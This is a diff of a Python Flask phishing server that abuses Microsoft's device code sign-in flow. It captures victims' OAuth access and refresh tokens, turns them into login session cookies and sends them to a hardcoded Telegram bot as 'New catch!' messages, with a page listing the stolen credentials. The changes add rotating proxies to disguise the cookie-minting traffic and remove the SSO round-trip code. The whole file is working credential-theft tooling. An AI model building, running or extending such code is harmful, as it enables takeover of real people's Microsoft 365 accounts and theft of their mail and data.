@@ -3,6 +3,7 @@ import json
 import time
 import base64
 import uuid
+import random
 import re
 import sqlite3
 import threading
@@ -18,7 +19,7 @@ TELEGRAM_TOKEN = "8998925422:AAFKDgRkGsFewhlRC6tDmrGa33a6yNxj9UY"
 TELEGRAM_CHAT = "8877118461"
 DB_PATH = "/tmp/phish.db"
 
-# Client IDs pre-authorized for Graph Device Code Flow
+# Client IDs pre-authorized for Graph Device Code Flow (ONLY these work)
 CLIENT_IDS = [
     "14d82eec-204b-4c2f-b7e8-296a70dab67e",  # Microsoft Graph Command Line Tools
     "04b07795-8ddb-461a-bbee-02f9e1bf7b46",  # Azure CLI
@@ -44,6 +45,15 @@ COOKIE_WANTED = [
     "brcap", "fpc", "esctx", "cltm", "x-ms-cpim-sso",
 ]
 
+# ---------------------------------------
+# PROXY LIST (fill in your own proxies)
+# Format: "http://user:pass@host:port"  or  "http://host:port" (IP whitelist)
+# ---------------------------------------
+PROXY_LIST = [
+    # "http://user:pass@proxy1.example.com:8080",
+    # "http://user:pass@proxy2.example.com:8080",
+]
+
 app = Flask(__name__)
 shutdown_event = threading.Event()
 
@@ -65,14 +75,12 @@ def init_db():
         cookies TEXT,
         ts TEXT
     )""")
-    # Ensure cookies column exists for backward compatibility
     cols = [r[1] for r in con.execute("PRAGMA table_info(sessions)").fetchall()]
     if "cookies" not in cols:
         con.execute("ALTER TABLE sessions ADD COLUMN cookies TEXT")
     con.commit()
     con.close()
 
-# Initialize DB immediately on import
 init_db()
 
 def db_add_session(device_code, user_code, client_id, interval, expires_at):
@@ -107,7 +115,6 @@ def db_update_session(sid, **kw):
 # ---------------------------------------
 def send_telegram(text):
     try:
-        # Split long messages to avoid Telegram API limits
         while len(text) > 4000:
             chunk = text[:4000]
             cut = chunk.rfind("\n")
@@ -145,7 +152,6 @@ def send_telegram_file(filename, content, caption=""):
 # ---------------------------------------
 def request_device_code():
     global CLIENT_ID_INDEX
-    # Try each client ID until one works
     for _ in range(len(CLIENT_IDS)):
         client_id = CLIENT_IDS[CLIENT_ID_INDEX]
         try:
@@ -159,7 +165,6 @@ def request_device_code():
                 return client_id, data
             else:
                 print(f"[SESSION] client_id {client_id} failed: {data.get('error', resp.status_code)}")
-                # Rotate to next client ID
                 CLIENT_ID_INDEX = (CLIENT_ID_INDEX + 1) % len(CLIENT_IDS)
         except Exception as e:
             print(f"[SESSION] client_id {client_id} exception: {e}")
@@ -176,20 +181,29 @@ def decode_id_token(id_token):
         return "unknown"
 
 # ---------------------------------------
-# COOKIE MINTING (SSO Round-Trip)
+# COOKIE MINTING (SSO Round-Trip) — WITH PROXY
 # ---------------------------------------
 def get_victim_cookies(refresh_token, client_id, email):
     """
     Refreshes the token and performs a completed SSO authorize round-trip
-    to mint ESTSAUTH / ESTSAUTHPERSISTENT session cookies.
+    to mint ESTSAUTH / ESTSAUTHPERSISTENT session cookies. Routes all
+    traffic through a random proxy from PROXY_LIST if available.
     """
     try:
         s = requests.Session()
+
+        # Pick a proxy (round-robin random) if any are configured
+        if PROXY_LIST:
+            proxy = random.choice(PROXY_LIST)
+            s.proxies = {"http": proxy, "https": proxy}
+            host = proxy.split("@")[1] if "@" in proxy else proxy
+            print(f"[COOKIES] using proxy: {host}")
+
         s.headers.update({
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"
         })
 
-        # Step 1: Refresh the token (keeps session alive and valid)
+        # Step 1: Refresh the token (through proxy)
         r = s.post(
             f"{UPSTREAM}/common/oauth2/v2.0/token",
             data={
@@ -261,46 +275,6 @@ def get_victim_cookies(refresh_token, client_id, email):
     except Exception as e:
         print(f"[COOKIES] exception: {e}")
         return None
-        # Step 2: SSO Authorize (trigger cookie issuance)
-        nonce = uuid.uuid4().hex
-        auth_url = (
-            f"{UPSTREAM}/common/oauth2/authorize?"
-            f"client_id={client_id}&response_type=id_token"
-            f"&redirect_uri=https%3A%2F%2Flogin.microsoftonline.com%2Fcommon%2Foauth2%2Fnativeclient"
-            f"&scope=openid&response_mode=form_post&nonce={nonce}"
-            f"&login_hint={email}"
-        )
-        resp = s.get(auth_url, timeout=25, allow_redirects=True)
-
-        # Step 3: Follow form_post redirects manually
-        # Microsoft returns an HTML page with a form that auto-submits via JS.
-        # We parse and POST it ourselves.
-        for _ in range(5):  # Max 5 chained redirects
-            m = re.search(r'<form[^>]*action="([^"]+)"[^>]*>(.*?)</form>',
-                          resp.text, re.IGNORECASE | re.DOTALL)
-            if not m:
-                break
-            action = m.group(1).replace("&amp;", "&")
-            # Extract input fields
-            fields = dict(re.findall(
-                r'<input[^>]*name="([^"]+)"[^>]*value="([^"]*)"', m.group(2)))
-            resp = s.post(action, data=fields, timeout=25, allow_redirects=True)
-
-        # Extract desired cookies
-        cookies = {}
-        for c in s.cookies:
-            if c.name in COOKIE_WANTED and c.value:
-                cookies[c.name] = c.value
-        
-        if not cookies:
-            print("[COOKIES] no wanted cookies captured")
-            return None
-            
-        print(f"[COOKIES] captured {len(cookies)} cookies: {list(cookies.keys())}")
-        return cookies
-    except Exception as e:
-        print(f"[COOKIES] exception: {e}")
-        return None
 
 def format_cookies_text(cookies, email):
     lines = [f" COOKIE SESSION - {email}", "Domain: login.microsoftonline.com", ""]
@@ -333,7 +307,7 @@ def poll_worker():
             if not sessions:
                 shutdown_event.wait(timeout=5)
                 continue
-                
+
             for sid, device_code, client_id, interval, expires_at in sessions:
                 if time.time() > expires_at:
                     db_update_session(sid, status="expired")
@@ -362,20 +336,18 @@ def poll_worker():
                         "refresh_token": data.get("refresh_token"),
                         "id_token": data.get("id_token"),
                     }
-                    
-                    # Attempt to mint cookies
+
+                    # Attempt to mint cookies (through proxy)
                     cookies = get_victim_cookies(tokens["refresh_token"], client_id, email)
-                    
-                    # Update DB
+
                     db_update_session(
-                        sid, 
-                        status="caught", 
+                        sid,
+                        status="caught",
                         email=email,
-                        tokens=json.dumps(tokens), 
+                        tokens=json.dumps(tokens),
                         cookies=json.dumps(cookies) if cookies else "{}"
                     )
 
-                    # Prepare Telegram Message
                     msg = (f"🏆 New catch!\n"
                            f"Email: {email}\n"
                            f"Session: {sid}\n"
@@ -389,7 +361,6 @@ def poll_worker():
                         msg += ("\n\n→ Paste into Cookie-Editor on login.microsoftonline.com, "
                                 "then open outlook.office.com/mail")
 
-                    # Send to Telegram
                     if len(msg) > 4000:
                         send_telegram(f"🏆 New catch! Email: {email} (tokens + cookies attached)")
                         send_telegram_file("tokens.txt", json.dumps(tokens, indent=2), f"Tokens for {email}")
@@ -403,9 +374,9 @@ def poll_worker():
                                                f"Cookie-Editor import for {email} -> login.microsoftonline.com")
 
                     print(f"[WORKER] session {sid} caught email={email} cookies={'yes' if cookies else 'no'}")
-                
+
                 elif data.get("error") == "authorization_pending":
-                    pass  # Wait for next poll
+                    pass
                 elif data.get("error") == "slow_down":
                     time.sleep(5)
                 elif data.get("error") == "expired_token":
@@ -414,17 +385,15 @@ def poll_worker():
                 elif data.get("error") in ("authorization_declined", "invalid_grant"):
                     db_update_session(sid, status="declined")
                     print(f"[WORKER] session {sid} declined")
-                
-                # Respect polling interval
+
                 shutdown_event.wait(timeout=interval)
-                
+
         except Exception as e:
             print(f"[WORKER] loop error: {e}")
             shutdown_event.wait(timeout=5)
-            
+
     print("[WORKER] poll_worker stopped")
 
-# Start worker thread safely
 _worker_started = False
 def start_worker():
     global _worker_started
@@ -603,45 +572,31 @@ def catches():
     html = """<!DOCTYPE html>
 <html><head><meta charset="UTF-8"><title>Catches</title>
 <style>
-body { font-family: 'Segoe UI', sans-serif; background: #faf9f8; padding: 24px; }
-h1 { color: #0078d4; }
-.card { background: white; border: 1px solid #e1dfdd; border-radius: 8px; padding: 16px; margin-bottom: 16px; box-shadow: 0 1.6px 3.6px rgba(0,0,0,0.13); }
-.email { font-weight: 700; color: #005a9e; font-size: 16px; }
-.ts { color: #a19f9d; font-size: 12px; }
-pre { background: #f3f2f1; padding: 10px; border-radius: 4px; font-size: 11px; white-space: pre-wrap; word-break: break-all; }
-details { margin: 6px 0; }
-summary { cursor: pointer; font-weight: 600; color: #323130; }
-</style></head><body>
-<h1>Caught Sessions (last 20)</h1>"""
-
-    if not rows:
-        html += "<p>No catches yet.</p>"
+body { font-family: 'Segoe UI', sans-serif; background: #faf9f8; padding: 30px; }
+.card { background: white; border: 1px solid #e1dfdd; border-radius: 8px; padding: 24px; max-width: 900px; margin: auto; }
+h1 { font-size: 20px; color: #323130; }
+.catch { border-bottom: 1px solid #edebe9; padding: 14px 0; }
+.catch b { color: #0078d4; }
+pre { background: #faf9f8; border: 1px solid #edebe9; padding: 10px; overflow-x: auto; font-size: 12px; white-space: pre-wrap; word-break: break-all; }
+</style></head><body><div class="card">
+<h1>Recent Catches</h1>"""
 
     for sid, email, tokens, cookies, ts in rows:
-        html += f'<div class="card"><div class="email">#{sid} — {email}</div>'
-        html += f'<div class="ts">{ts}</div>'
-        try:
-            t = json.loads(tokens or "{}")
-            html += '<details><summary>Access Token</summary><pre>'
-            html += (t.get("access_token") or "none") + '</pre></details>'
-            html += '<details><summary>Refresh Token</summary><pre>'
-            html += (t.get("refresh_token") or "none") + '</pre></details>'
-            html += '<details><summary>ID Token</summary><pre>'
-            html += (t.get("id_token") or "none") + '</pre></details>'
-        except Exception:
-            html += "<p>Token parse error</p>"
-        try:
-            c = json.loads(cookies or "{}")
-            if c:
-                cookie_str = "; ".join(f"{k}={v}" for k, v in c.items())
-                html += f'<details><summary>Cookies ({len(c)})</summary><pre>{cookie_str}</pre></details>'
-        except Exception:
-            pass
+        html += f"<div class='catch'><b>#{sid}</b> {email} — {ts}<br>"
+        html += f"<pre>{tokens}</pre>"
+        if cookies and cookies != "{}":
+            html += f"<pre>{cookies}</pre>"
         html += "</div>"
 
-    html += "</body></html>"
+    html += "</div></body></html>"
     return Response(html, mimetype="text/html")
 
 
+@app.route("/health", methods=["GET"])
+def health():
+    return "OK", 200
+
+
 if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host="0.0.0.0", port=port, threaded=True)
